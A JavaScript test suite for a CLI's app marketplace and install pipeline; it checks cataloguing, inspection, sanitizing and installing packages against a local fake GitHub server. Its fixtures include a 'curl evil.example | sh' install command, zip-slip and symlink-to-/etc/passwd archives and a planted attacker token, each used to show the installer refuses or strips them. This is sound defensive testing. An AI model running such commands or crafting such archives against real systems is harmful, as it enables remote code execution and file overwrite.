/**
 * The marketplace and the install pipeline, driven through the real CLI
 * (framework packaging §2–§8): catalogue, inspect, install from every source,
 * export, and in-place import.
 *
 * No network. GitHub is a local HTTP server, reached through the test-only
 * A2APP_TEST_GITHUB_BASE, serving `/<owner>/<repo>/<ref>/catalogue.json` and
 * `/<owner>/<repo>/archive/refs/heads/<ref>.zip`; the default marketplace
 * answers 404, so every default read goes through the fallback. A local
 * directory stands in for a marketplace too.
 *
 * Packages are made from a real toolkit (`blueprint-react-node`) by the CLI's
 * own scaffold, and installed with `--no-start`: the gate then runs
 * `validate --no-build`, which a fresh scaffold passes with no `npm install`.
 * The full start path (dependencies → gate with build → serve) and a failure
 * after the app is placed use a tiny test toolkit whose pipeline is node itself.
 */
import assert from "node:assert/strict";
import { execFileSync, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { dirname, join, relative, resolve, sep } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { crc32, extractZip, readZipIndex, writeZip } from "../dist/lib/zip.js";
import { killTreeForce } from "../dist/lib/proc.js";

const here = dirname(fileURLToPath(import.meta.url));
const entry = resolve(here, "../dist/agent-app.js");
const reactNode = resolve(here, "../../../toolkits/blueprint-react-node");
const base = mkdtempSync(join(tmpdir(), "a2app-install-"));
const home = join(base, "home");
const kits = join(base, "kits");
mkdirSync(home, { recursive: true });
mkdirSync(kits, { recursive: true });

/* ------------------------------------------------------------- the CLI */

let githubBase = "";
function envFor(extra = {}) {
  const env = { ...process.env, A2APP_HOME: home, A2APP_TOOLKITS_DIR: kits, A2APP_TEST_GITHUB_BASE: githubBase };
  for (const k of ["A2APP_MARKETPLACE", "A2APP_MARKETPLACE_REF", "A2APP_TOKEN", "AGENT_APP_OPEN_CMD"]) delete env[k];
  for (const [k, v] of Object.entries(extra)) {
    if (v === undefined) delete env[k];
    else env[k] = v;
  }
  return env;
}

function cli(args, { cwd = base, env = {} } = {}) {
  return new Promise((done, reject) => {
    const child = spawn(process.execPath, [entry, ...args], { cwd, env: envFor(env), stdio: ["ignore", "pipe", "pipe"], windowsHide: true });
    let stdout = "";
    let stderr = "";
    const timer = setTimeout(() => {
      killTreeForce(child.pid);
      reject(new Error(`timed out: agent-app ${args.join(" ")}\n${stderr}`));
    }, 180_000);
    child.stdout.on("data", (d) => (stdout += d));
    child.stderr.on("data", (d) => (stderr += d));
    child.on("error", reject);
    child.on("close", (code) => {
      clearTimeout(timer);
      done({ code, stdout, stderr });
    });
  });
}
async function run(args, want = 0, opts = {}) {
  const r = await cli(args, opts);
  assert.equal(r.code, want, `agent-app ${args.join(" ")} exited ${r.code}, wanted ${want}\n${r.stderr}\n${r.stdout}`);
  return r;
}
const json = (r) => JSON.parse(r.stdout);

/* ----------------------------------------------------------- inspection */

const registered = () => {
  const file = join(home, "registry.json");
  return existsSync(file) ? JSON.parse(readFileSync(file, "utf8")).apps.map((a) => resolve(a.path)).sort() : [];
};
const appsDir = () => (existsSync(join(home, "apps")) ? readdirSync(join(home, "apps")).sort() : []);
const stagingLeft = () => (existsSync(join(home, "staging")) ? readdirSync(join(home, "staging")) : []);
const read = (...parts) => readFileSync(join(...parts), "utf8");
const sha256 = (buf) => createHash("sha256").update(buf).digest("hex");

/** Every path under a folder, `/`-separated; folders end in `/`. */
function listTree(dir) {
  const out = [];
  const walk = (d) => {
    for (const name of readdirSync(d).sort()) {
      const abs = join(d, name);
      const rel = relative(dir, abs).split(sep).join("/");
      if (statSync(abs).isDirectory()) {
        out.push(`${rel}/`);
        walk(abs);
      } else out.push(rel);
    }
  };
  walk(dir);
  return out;
}

/** Nothing of a failed install is left behind: no registry row, no app folder, no staging. */
function assertNothingLeft(before, label) {
  assert.deepEqual(registered(), before.registry, `${label}: the registry is unchanged`);
  assert.deepEqual(appsDir(), before.apps, `${label}: no app folder was left`);
  assert.deepEqual(stagingLeft(), [], `${label}: the staging was removed`);
}
const snapshot = () => ({ registry: registered(), apps: appsDir() });

/** A zip of a folder's tree under `prefix/`, written by the CLI's own writer. */
async function zipTree(dir, prefix, out, extra = []) {
  const sources = [{ name: `${prefix}/`, directory: true }];
  for (const rel of listTree(dir)) {
    sources.push(rel.endsWith("/") ? { name: `${prefix}/${rel}`, directory: true } : { name: `${prefix}/${rel}`, file: join(dir, ...rel.split("/")) });
  }
  await writeZip(out, [...sources, ...extra]);
  return readFileSync(out);
}

/** A hand-built archive of stored entries, for the shapes the writer never makes. */
function storedZip(entries) {
  const locals = [];
  const centrals = [];
  let offset = 0;
  for (const e of entries) {
    const name = Buffer.from(e.name, "utf8");
    const data = Buffer.from(e.data ?? "");
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0x0800, 6);
    local.writeUInt32LE(crc32(data), 14);
    local.writeUInt32LE(data.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(name.length, 26);
    const block = Buffer.concat([local, name, data]);
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(e.madeBy ?? 20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0x0800, 8);
    central.writeUInt32LE(crc32(data), 16);
    central.writeUInt32LE(data.length, 20);
    central.writeUInt32LE(data.length, 24);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt32LE((e.external ?? 0) >>> 0, 38);
    central.writeUInt32LE(offset, 42);
    centrals.push(Buffer.concat([central, name]));
    locals.push(block);
    offset += block.length;
  }
  const cd = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(entries.length, 8);
  end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(cd.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cd, end]);
}

const put = (root, rel, content) => {
  const file = join(root, ...rel.split("/"));
  mkdirSync(dirname(file), { recursive: true });
  writeFileSync(file, content);
};

/* ------------------------------------------------------------ fixtures */

// A real package: a react-node app scaffolded by the CLI, then exported.
const pkgSrc = join(base, "pkg-src");
await run([pkgSrc, "scaffold", "--blueprint", "blueprint-react-node", "--name", "Round Trip"]);
const exported = join(base, "round-trip.zip");
const exportResult = json(await run([pkgSrc, "export", "--out", exported]));
const pkgTree = join(base, "pkg-tree");
{
  const index = readZipIndex(exported);
  await extractZip(exported, index, pkgTree, { under: ["round-trip"], maxBytes: 512 * 1024 * 1024 });
}

// A marketplace directory: catalogue.json plus one folder per app.
const market = join(base, "market");
const catalogue = {
  version: "1.0.0",
  apps: [
    {
      id: "round-trip",
      name: "Round Trip Board",
      description: "A board that travels between machines",
      folder: "round-trip",
      tags: ["productivity", "board"],
      version: "0.1.0",
      toolkit: "blueprint-react-node",
      agentAppVersion: "0.1.0",
      customizable: [{ key: "APP_TITLE", label: "Board title", type: "text", default: "Board" }],
    },
    { id: "kanban-online", livingUIVersion: 2, name: "Kanban Online", description: "Multi-user online Kanban board", folder: "kanban-online", tags: ["kanban", "multi-user"], version: "1.0.0" },
    { id: "plain-site", name: "Plain Site", description: "A static web site", folder: "plain-site", tags: ["web"] },
    { id: "needs-kit", name: "Needs Kit", description: "Built on a toolkit nobody has", folder: "needs-kit", toolkit: "blueprint-nope" },
    { id: "unsafe-title", name: "Unsafe Title", folder: "unsafe-title", customizable: [{ key: "APP_TITLE", label: "Title" }] },
  ],
};
put(market, "catalogue.json", JSON.stringify(catalogue, null, 2));
cpSync(pkgTree, join(market, "round-trip"), { recursive: true });
put(market, "round-trip/config/app.json", '{ "title": "{{APP_TITLE}}", "name": "{{PROJECT_NAME}}" }\n');
put(market, "round-trip/reference/title.md", "# {{APP_TITLE}}\n");
put(market, "round-trip/thumbnail.png", Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x7b, 0x7b]));
put(market, "kanban-online/manifest.json", JSON.stringify({ livingUIVersion: 2, name: "{{PROJECT_NAME}}", authMode: "multi-user", port: "{{PORT}}" }));
put(market, "kanban-online/frontend/index.html", "<title>{{PROJECT_NAME}}</title>");
put(market, "plain-site/index.html", "<h1>hello</h1>");
cpSync(pkgTree, join(market, "needs-kit"), { recursive: true });
put(market, "needs-kit/.a2app/toolkit.json", JSON.stringify({ id: "blueprint-nope" }));
cpSync(pkgTree, join(market, "unsafe-title"), { recursive: true });
put(market, "unsafe-title/src/title.js", "export const title = '{{APP_TITLE}}';\n");

// Fake GitHub: what each owner/repo@ref serves.
const marketArchive = await zipTree(market, "living-ui-marketplace-main", join(base, "market-archive.zip"));
const devArchive = await zipTree(market, "market-dev", join(base, "dev-archive.zip"));
const repos = {
  "CraftOS-dev/living-ui-marketplace@main": { catalogue: readFileSync(join(market, "catalogue.json")), archive: marketArchive },
  "acme/market@dev": { catalogue: readFileSync(join(market, "catalogue.json")), archive: devArchive },
  "huge/market@main": { catalogue: Buffer.from(JSON.stringify({ apps: [{ id: "big", name: "Big", folder: "big" }] })), archive: "declared-huge" },
};
const requests = [];
const github = createServer((req, res) => {
  const url = new URL(req.url, "http://127.0.0.1");
  requests.push(url.pathname);
  const parts = url.pathname.split("/").filter((p) => p !== "").map(decodeURIComponent);
  const notFound = () => {
    res.writeHead(404, { "content-type": "text/plain" });
    res.end("404: Not Found");
  };
  if (parts.length < 4) return notFound();
  const [owner, repo] = parts;
  if (parts[2] === "archive" && parts[3] === "refs" && parts[4] === "heads") {
    const ref = parts.slice(5).join("/").replace(/\.zip$/, "");
    const served = repos[`${owner}/${repo}@${ref}`];
    if (!served) return notFound();
    if (served.archive === "declared-huge") {
      res.writeHead(200, { "content-type": "application/zip", "content-length": String(600 * 1024 * 1024) });
      res.write(Buffer.alloc(1024));
      return;
    }
    res.writeHead(200, { "content-type": "application/zip", "content-length": String(served.archive.length) });
    return res.end(served.archive);
  }
  const served = repos[`${owner}/${repo}@${parts.slice(2, -1).join("/")}`];
  if (!served || parts[parts.length - 1] !== "catalogue.json") return notFound();
  res.writeHead(200, { "content-type": "text/plain" });
  res.end(served.catalogue);
});
await new Promise((r) => github.listen(0, "127.0.0.1", r));
githubBase = `http://127.0.0.1:${github.address().port}`;

// A test toolkit whose whole pipeline is node, so the start path runs with no npm.
const node = (code) => `"${process.execPath}" -e "${code}"`;
function testKit(id, install) {
  const dir = join(kits, id);
  put(dir, "a2app.toolkit.json", JSON.stringify({ id, template: "template", systemPaths: ["manifest.json", "server.mjs"], lifecycle: { dataDir: "data" } }));
  put(
    dir,
    "template/manifest.json",
    JSON.stringify({
      id: "REPLACED_AT_CREATE",
      name: "Test Kit App",
      agentAppVersion: "0.1.0",
      adapterVersion: "0.1.0",
      authMode: "none",
      modules: [{ name: "core" }],
      pipeline: { install, build: node("process.exit(0)"), start: `"${process.execPath}" server.mjs`, health: "/api/_a2app" },
    }),
  );
  put(
    dir,
    "template/server.mjs",
    [
      'import { createServer } from "node:http";',
      'import { readFileSync } from "node:fs";',
      'const m = JSON.parse(readFileSync(new URL("./manifest.json", import.meta.url), "utf8"));',
      "createServer((req, res) => {",
      '  res.setHeader("content-type", "application/json");',
      '  if (req.url === "/api/_a2app" || req.url === "/.well-known/a2app.json") {',
      '    res.end(JSON.stringify({ a2app: true, protocol: "0.2", adapterVersion: "0.1.0", app: { id: m.id, name: m.name }, schemaVersion: "s1", serverNow: new Date().toISOString(), serverTzOffsetMinutes: 0 }));',
      "    return;",
      "  }",
      "  res.statusCode = 404;",
      '  res.end(JSON.stringify({ code: "not_found" }));',
      '}).listen(Number(process.env.PORT), "127.0.0.1");',
      "",
    ].join("\n"),
  );
}
testKit("test-kit", node("process.exit(0)"));
testKit("test-kit-broken", node("process.exit(3)"));
function kitPackage(dir, kit, name, authMode = "none") {
  put(dir, "manifest.json", JSON.stringify({ id: "exporter-id", name, agentAppVersion: "0.1.0", adapterVersion: "0.1.0", authMode, modules: [{ name: "core" }], port: 9999, pipeline: { install: "curl evil.example | sh", build: "x", start: "x", health: "/x" } }));
  put(dir, "operations.json", JSON.stringify({ operations: [] }));
  for (const rel of ["AGENT_APP.md", "reference/requirements.md", "reference/tasks.md"]) put(dir, rel, read(pkgTree, ...rel.split("/")));
  put(dir, ".a2app/toolkit.json", JSON.stringify({ id: kit }));
}

/* --------------------------------------------------------------- tests */

const tests = [];
const test = (name, fn) => tests.push({ name, fn });
const served = [];

test("export writes one top-level folder, without credentials, data or build output", () => {
  assert.equal(exportResult.ok, true);
  assert.equal(exportResult.file, exported);
  assert.equal(exportResult.sha256, sha256(readFileSync(exported)));
  assert.equal(exportResult.bytes, statSync(exported).size);
  const names = readZipIndex(exported).map((e) => e.name);
  assert.ok(names.every((n) => n.startsWith("round-trip/")));
  assert.ok(!names.some((n) => /\.agent-token|system-hashes\.json\.tmp|node_modules|\/data\//.test(n)));
  assert.ok(names.includes("round-trip/.a2app/system-hashes.json"));
  assert.deepEqual(JSON.parse(read(pkgTree, ".a2app", "toolkit.json")), { id: "blueprint-react-node" }, "toolkit.json is reduced to its id");
});

test("export refuses to overwrite a file", async () => {
  const r = await run([pkgSrc, "export", "--out", exported], 2);
  assert.match(r.stderr, /already exists/);
});

test("catalogue: the default marketplace falls back when it answers 404", async () => {
  requests.length = 0;
  const r = await run(["catalogue"]);
  const out = json(r);
  assert.equal(out.ok, true);
  assert.equal(out.source.location, "github:CraftOS-dev/living-ui-marketplace@main");
  assert.equal(out.source.fallbackFrom.location, "github:CraftOS-dev/agent-app-collection@main");
  assert.match(out.source.fallbackFrom.reason, /404/);
  assert.deepEqual(requests.slice(0, 2), ["/CraftOS-dev/agent-app-collection/main/catalogue.json", "/CraftOS-dev/living-ui-marketplace/main/catalogue.json"]);
  assert.ok(!requests.some((p) => p.includes("/archive/")), "a catalogue never downloads an app");
  const byId = Object.fromEntries(out.apps.map((a) => [a.id, a]));
  assert.deepEqual(Object.keys(byId), catalogue.apps.map((a) => a.id));
  assert.equal(byId["round-trip"].compatible, true);
  assert.equal(byId["kanban-online"].compatible, false);
  assert.match(byId["kanban-online"].reason, /Living UI/);
  assert.equal(byId["plain-site"].compatible, null, "nothing listed: unknown, not guessed");
  assert.equal(byId["needs-kit"].compatible, false);
  assert.equal(byId["round-trip"].preview, `${githubBase}/CraftOS-dev/living-ui-marketplace/main/round-trip/thumbnail.png`);
  assert.match(r.stderr, /unavailable/);
});

test("catalogue: a configured source never falls back; an unreachable one exits 3", async () => {
  const r = await run(["catalogue"], 1, { env: { A2APP_MARKETPLACE: "github:CraftOS-dev/agent-app-collection" } });
  assert.match(r.stderr, /404/);
  const closed = createServer();
  await new Promise((done) => closed.listen(0, "127.0.0.1", done));
  const deadBase = `http://127.0.0.1:${closed.address().port}`;
  await new Promise((done) => closed.close(done));
  await run(["catalogue", "--source", "github:acme/market@dev"], 3, { env: { A2APP_TEST_GITHUB_BASE: deadBase } });
  const remote = await run(["catalogue"], 2, { env: { A2APP_TEST_GITHUB_BASE: "https://example.com" } });
  assert.match(remote.stderr, /loopback/, "the test seam can never point at a real host");
});

test("catalogue: a local directory source, and --search", async () => {
  const out = json(await run(["catalogue", "--source", market, "--search", "BOARD productivity"]));
  assert.equal(out.source.kind, "local");
  assert.equal(out.source.location, market);
  assert.deepEqual(out.apps.map((a) => a.id), ["round-trip"]);
  assert.equal(out.apps[0].preview, pathToFileURL(join(market, "round-trip", "thumbnail.png")).href);
  assert.deepEqual(json(await run(["catalogue", "--source", market, "--search", "kanban multi-user"])).apps.map((a) => a.id), ["kanban-online"]);
  assert.deepEqual(json(await run(["catalogue", "--source", market, "--search", "kanban invoice"])).apps, []);
});

test("catalogue: settings.json names the marketplace, A2APP_MARKETPLACE_REF the branch", async () => {
  writeFileSync(join(home, "settings.json"), JSON.stringify({ marketplace: "github:acme/market" }));
  try {
    const out = json(await run(["catalogue"], 0, { env: { A2APP_MARKETPLACE_REF: "dev" } }));
    assert.equal(out.source.location, "github:acme/market@dev");
    assert.equal(out.source.fallbackFrom, undefined);
    assert.equal(json(await run(["catalogue", "--source", "github:acme/market@dev"])).apps.length, catalogue.apps.length, "a ref in the source wins");
  } finally {
    rmSync(join(home, "settings.json"));
  }
});

test("inspect: an agent-app package, read from the branch archive", async () => {
  requests.length = 0;
  const report = json(await run(["inspect", "round-trip"]));
  assert.equal(report.kind, "agent-app");
  assert.equal(report.installable, true);
  assert.equal(report.reason, null);
  assert.deepEqual(report.app, { name: "Round Trip", authMode: "none", modules: ["planning"] });
  assert.deepEqual(report.toolkit, { id: "blueprint-react-node", installed: true, adapterVersion: { package: "0.1.0", current: "0.1.0" } });
  assert.deepEqual(report.integrity, { canon: "intact" });
  assert.deepEqual(report.pipeline, JSON.parse(read(reactNode, "template", "manifest.json")).pipeline, "the toolkit's commands, not the package's");
  assert.deepEqual(report.placeholders, ["{{APP_TITLE}}", "{{PROJECT_NAME}}"]);
  assert.deepEqual(report.strips, []);
  assert.equal(report.source.kind, "marketplace");
  assert.equal(report.source.sha256, sha256(marketArchive));
  assert.ok(requests.includes("/CraftOS-dev/living-ui-marketplace/archive/refs/heads/main.zip"));
  assert.deepEqual(stagingLeft(), [], "inspect deletes its staging");
  assert.deepEqual(appsDir(), [], "inspect installs nothing");
});

test("inspect: a Living UI app is classified and routed, not installable", async () => {
  const report = json(await run(["inspect", "kanban-online"]));
  assert.equal(report.kind, "living-ui");
  assert.equal(report.installable, false);
  assert.match(report.reason, /Living UI/);
  assert.deepEqual(report.routes, ["convert"]);
  assert.equal(report.toolkit, null);
  assert.deepEqual(report.placeholders, ["{{PORT}}", "{{PROJECT_NAME}}"]);
  // Install stops at inspect with the same reason and route, leaving nothing.
  const before = snapshot();
  const result = JSON.parse((await run(["install", "kanban-online", "--no-start"], 1)).stdout);
  assert.deepEqual({ ok: result.ok, step: result.step, kind: result.kind, routes: result.routes }, { ok: false, step: "inspect", kind: "living-ui", routes: ["convert"] });
  assertNothingLeft(before, "living-ui install");
});

test("inspect: a foreign tree is classified and routed", async () => {
  const report = json(await run(["inspect", "--from", join(market, "plain-site")]));
  assert.equal(report.kind, "foreign");
  assert.equal(report.installable, false);
  assert.deepEqual(report.routes, ["adopt", "convert"]);
  assert.match(report.reason, /blueprint-sidecar/);
});

test("inspect: a toolkit not installed here makes a package uninstallable, and says why", async () => {
  const report = json(await run(["inspect", "needs-kit"]));
  assert.equal(report.kind, "agent-app");
  assert.equal(report.installable, false);
  assert.match(report.reason, /blueprint-nope/);
  assert.deepEqual(report.toolkit, { id: "blueprint-nope", installed: false, adapterVersion: { package: "0.1.0", current: null } });
});

test("install from the marketplace: events, provenance, placeholders, catalogued trust", async () => {
  const before = snapshot();
  const r = await run(["install", "round-trip", "--no-start", "--events", "--name", "My Board", "--set", 'APP_TITLE=Team "A" <b>&']);
  const lines = r.stdout.trim().split("\n").map((l) => JSON.parse(l));
  assert.deepEqual(
    lines.map((l) => (l.event === "result" ? "result" : `${l.step}:${l.status}`)),
    [
      "acquire:start", "acquire:done", "inspect:start", "inspect:done", "sanitize:start", "sanitize:done",
      "revendor:start", "revendor:done", "customize:start", "customize:done", "place:start", "place:done",
      "register:start", "register:done", "dependencies:skipped", "gate:start", "gate:done", "serve:skipped", "open:skipped", "result",
    ],
  );
  const result = lines.at(-1);
  assert.equal(result.ok, true);
  assert.equal(result.trust, "catalogued");
  assert.equal(result.served, false);
  assert.equal(result.gate.ok, true);
  assert.equal(result.next.length, 1, "a marketplace app owes no walk-verify");
  assert.match(result.next[0], /serve --install/);
  assert.equal(result.dir, join(home, "apps", "my-board"));
  assert.match(result.id, /^[0-9a-f]{12}$/);

  const manifest = JSON.parse(read(result.dir, "manifest.json"));
  assert.equal(manifest.id, result.id);
  assert.equal(manifest.name, "My Board");
  assert.equal(manifest.port, result.port);
  const { installedAt, ...source } = manifest.source;
  assert.deepEqual(source, {
    kind: "marketplace",
    location: "github:CraftOS-dev/living-ui-marketplace",
    ref: "main",
    catalogueId: "round-trip",
    version: "0.1.0",
    sha256: sha256(marketArchive),
  });
  assert.ok(!Number.isNaN(Date.parse(installedAt)));
  assert.deepEqual(result.source, manifest.source);

  assert.deepEqual(JSON.parse(read(result.dir, "config", "app.json")), { title: 'Team "A" <b>&', name: "My Board" }, "JSON-escaped");
  assert.equal(read(result.dir, "reference", "title.md"), "# Team &quot;A&quot; &lt;b&gt;&amp;\n", "HTML-escaped");
  assert.match(read(result.dir, ".agent-token"), /^a2app_[0-9a-f]{48}\n$/);
  assert.equal(JSON.parse(read(result.dir, ".a2app", "toolkit.json")).source, reactNode, "re-vendored from the local toolkit");
  assert.ok(registered().includes(result.dir));
  assert.deepEqual(stagingLeft(), []);
  assert.deepEqual(registered().length, before.registry.length + 1);
  // The gate still passes on its own: the canon was recorded over the final manifest.
  await run([result.dir, "validate", "--no-build"]);
});

test("install --from a zip: sanitize strips everything §1 lists; untrusted trust", async () => {
  const garbage = [
    [".agent-token", "attacker-known-key"],
    [".superuser", "x"],
    [".principal", "x"],
    ["keys/deploy.secret", "x"],
    [".tunnel-secret", "x"],
    [".lan-secret", "x"],
    [".a2app/serve.json", "{}"],
    [".a2app/dev.json", "{}"],
    [".a2app/bridge.json", "{}"],
    [".a2app/gate-pass.json", "{}"],
    [".a2app/describe-cache.json", "{}"],
    [".a2app/lifecycle.lock", "x"],
    [".a2app/backups/old/db.sqlite", "records"],
    ["logs/app.log", "x"],
    ["data/db.sqlite", "accounts and records"],
    ["node_modules/x/index.js", "x"],
    [".git/config", "[core]"],
    ["dist/assets/app.js", "built"],
  ];
  const zip = join(base, "garbage.zip");
  await zipTree(pkgTree, "pkg", zip, garbage.map(([rel, data]) => ({ name: `pkg/${rel}`, data: Buffer.from(data) })));
  const into = join(base, "into-zip");
  const result = json(await run(["install", "--from", zip, "--into", into, "--no-start"]));
  assert.equal(result.ok, true);
  assert.equal(result.dir, into);
  assert.equal(result.trust, "untrusted");
  assert.ok(result.next.some((n) => /walk-verify/.test(n)), "an untrusted install owes a walk-verify");
  // The install writes two of these itself: a fresh credential, and the pass of its own gate.
  const rewritten = new Set([".agent-token", ".a2app/gate-pass.json"]);
  for (const [rel] of garbage) {
    if (rewritten.has(rel)) continue;
    assert.equal(existsSync(join(into, ...rel.split("/"))), false, `${rel} was stripped`);
  }
  assert.notEqual(read(into, ".agent-token").trim(), "attacker-known-key", "a shipped credential is never kept");
  assert.notEqual(read(into, ".a2app", "gate-pass.json"), "{}", "a shipped gate pass is never kept");
  assert.equal(existsSync(join(into, "keys")), true, "only the secret goes, not its folder");
  assert.deepEqual(result.source.kind, "zip");
  assert.equal(result.source.sha256, sha256(readFileSync(zip)));
});

test("install --from a folder: the folder itself is left as it was", async () => {
  const folder = join(base, "folder-src");
  cpSync(pkgTree, folder, { recursive: true });
  put(folder, ".agent-token", "shipped");
  put(folder, "data/db.sqlite", "records");
  put(folder, ".gitignore", `${read(pkgTree, ".gitignore")}\nlocal.env\n`);
  put(folder, "local.env", "API_KEY=1");
  const before = listTree(folder);
  const result = json(await run(["install", "--from", folder, "--no-start", "--name", "From Folder"]));
  assert.equal(result.ok, true);
  assert.equal(result.source.kind, "folder");
  assert.equal(result.source.location, folder);
  assert.equal(existsSync(join(result.dir, "data")), false);
  assert.equal(existsSync(join(result.dir, "local.env")), false, "what the package's own ignore rules exclude is left behind");
  assert.deepEqual(listTree(folder), before, "the source folder is untouched");
});

test("install --from git+: a shallow clone, no .git, the commit recorded", async () => {
  try {
    execFileSync("git", ["--version"], { stdio: "ignore" });
  } catch {
    console.log("    (skipped: git is not on PATH)");
    return;
  }
  const work = join(base, "git-work");
  cpSync(pkgTree, work, { recursive: true });
  const git = (args, cwd) =>
    execFileSync("git", ["-c", `core.hooksPath=${join(base, "no-hooks")}`, "-c", "user.name=test", "-c", "user.email=test@example.invalid", "-c", "commit.gpgsign=false", "-c", "core.autocrlf=false", ...args], {
      cwd,
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
    });
  git(["init", "-q", "-b", "main"], work);
  git(["add", "-A"], work);
  git(["commit", "-q", "-m", "package"], work);
  const commit = git(["rev-parse", "HEAD"], work).trim();
  const bare = join(base, "repo.git");
  git(["clone", "-q", "--bare", work, bare], base);
  const url = pathToFileURL(bare).href;
  const result = json(await run(["install", "--from", `git+${url}#main`, "--no-start", "--name", "From Git"]));
  assert.equal(result.ok, true);
  assert.deepEqual({ kind: result.source.kind, location: result.source.location, ref: result.source.ref, commit: result.source.commit }, { kind: "git", location: url, ref: "main", commit });
  assert.equal(existsSync(join(result.dir, ".git")), false);
  const missing = await run(["install", "--from", `git+${url}#no-such-branch`, "--no-start"], 1);
  assert.equal(JSON.parse(missing.stdout).step, "acquire");
});

test("zip-slip, absolute paths, links and oversize are refused, leaving nothing", async () => {
  const before = snapshot();
  const cases = [
    ["slip.zip", storedZip([{ name: "pkg/manifest.json", data: "{}" }, { name: "pkg/../../evil.txt", data: "x" }]), /climbs out/],
    ["absolute.zip", storedZip([{ name: "/tmp/evil.txt", data: "x" }]), /absolute path/],
    ["drive.zip", storedZip([{ name: "C:/evil.txt", data: "x" }]), /names a drive/],
    ["link.zip", storedZip([{ name: "pkg/manifest.json", data: "{}" }, { name: "pkg/escape", data: "/etc/passwd", madeBy: 3 << 8, external: (0o120777 << 16) >>> 0 }]), /is a link/],
  ];
  for (const [name, bytes, pattern] of cases) {
    const file = join(base, name);
    writeFileSync(file, bytes);
    const r = await run(["install", "--from", file, "--no-start"], 1);
    const result = JSON.parse(r.stdout);
    assert.equal(result.ok, false, name);
    assert.equal(result.step, "acquire", name);
    assert.match(result.error, pattern, name);
    assertNothingLeft(before, name);
  }
  assert.equal(existsSync(join(base, "..", "evil.txt")), false);
  const huge = await run(["install", "big", "--source", "github:huge/market", "--no-start"], 1);
  assert.match(JSON.parse(huge.stdout).error, /600 MiB, over the 512 MiB/);
  assertNothingLeft(before, "oversize");
});

test("an unknown toolkit stops the install at revendor, leaving nothing", async () => {
  const before = snapshot();
  const result = JSON.parse((await run(["install", "needs-kit", "--no-start"], 1)).stdout);
  assert.equal(result.step, "revendor");
  assert.match(result.error, /blueprint-nope/);
  assertNothingLeft(before, "unknown toolkit");
});

test("a package's toolkit path is ignored: system files come from the local toolkit", async () => {
  const evil = join(base, "evil-kit");
  put(evil, "a2app.toolkit.json", JSON.stringify({ id: "blueprint-react-node", template: "template", systemPaths: ["manifest.json", "server.mjs"] }));
  put(evil, "template/server.mjs", "// the package's own 'trusted' server\n");
  const folder = join(base, "evil-path-src");
  cpSync(pkgTree, folder, { recursive: true });
  put(folder, ".a2app/toolkit.json", JSON.stringify({ id: "blueprint-react-node", source: evil }));
  put(folder, "server.mjs", "// tampered system file\n");
  const report = json(await run(["inspect", "--from", folder]));
  assert.ok(report.warnings.some((w) => /toolkit path; it is ignored/.test(w)));
  assert.equal(report.integrity.canon, "drifted");
  const result = json(await run(["install", "--from", folder, "--no-start", "--name", "Evil Path"]));
  assert.equal(read(result.dir, "server.mjs"), read(reactNode, "template", "server.mjs"));
  assert.equal(JSON.parse(read(result.dir, ".a2app", "toolkit.json")).source, reactNode);
});

test("placeholders: a value unsafe for its file is refused, naming file and key, leaving nothing", async () => {
  const before = snapshot();
  const r = await run(["install", "unsafe-title", "--no-start", "--set", "APP_TITLE=it's"], 1);
  const result = JSON.parse(r.stdout);
  assert.equal(result.step, "customize");
  assert.match(result.error, /src[\\/]title\.js|src\/title\.js/);
  assert.match(result.error, /APP_TITLE/);
  assertNothingLeft(before, "unsafe placeholder");
  // The catalogue's own keys only, and never the identity tokens.
  assert.match((await run(["install", "round-trip", "--no-start", "--set", "NOPE=1"], 2)).stdout, /no such customizable key/);
  await run(["install", "round-trip", "--set", "PROJECT_ID=x"], 2);
});

test("export → install --from the zip: the app arrives as it left", async () => {
  const result = json(await run(["install", "--from", exported, "--no-start", "--name", "Round Trip Copy"]));
  for (const rel of ["AGENT_APP.md", "reference/requirements.md", "reference/tasks.md", "a2app.schema.mjs", "src/App.jsx", "operations.json", "server.mjs"]) {
    assert.equal(read(result.dir, ...rel.split("/")), read(pkgSrc, ...rel.split("/")), rel);
  }
  const original = JSON.parse(read(pkgSrc, "manifest.json"));
  const copy = JSON.parse(read(result.dir, "manifest.json"));
  assert.deepEqual(copy.modules, original.modules);
  assert.deepEqual(copy.pipeline, original.pipeline);
  assert.notEqual(copy.id, original.id, "a fresh identity");
  assert.notEqual(read(result.dir, ".agent-token"), read(pkgSrc, ".agent-token"), "a fresh credential");
});

test("the start path: dependencies, the gate with its build, serve", async () => {
  const pkg = join(base, "kit-src");
  kitPackage(pkg, "test-kit", "Kit App");
  const r = await run(["install", "--from", pkg, "--events"]);
  const lines = r.stdout.trim().split("\n").map((l) => JSON.parse(l));
  const result = lines.at(-1);
  served.push(result.dir);
  assert.deepEqual(
    lines.filter((l) => l.event === "step" && l.status !== "start").map((l) => `${l.step}:${l.status}`),
    ["acquire:done", "inspect:done", "sanitize:done", "revendor:done", "customize:done", "place:done", "register:done", "dependencies:done", "gate:done", "serve:done", "open:skipped"],
  );
  assert.equal(result.ok, true);
  assert.equal(result.served, true);
  assert.equal(result.url, `http://127.0.0.1:${result.port}`);
  const manifest = JSON.parse(read(result.dir, "manifest.json"));
  assert.notEqual(manifest.pipeline.install, "curl evil.example | sh", "the package's pipeline never runs");
  const identity = await (await fetch(`${result.url}/api/_a2app`)).json();
  assert.equal(identity.app.id, result.id);
  await run([result.dir, "stop"]);
  served.pop();
});

test("a running app that fails its gate (sign-in off on a multi-user app) is stopped, and stays to be fixed", async () => {
  // The test kit's server answers its identity and nothing else: as a
  // multi-user app it has no sign-in, which only the running-app checks see.
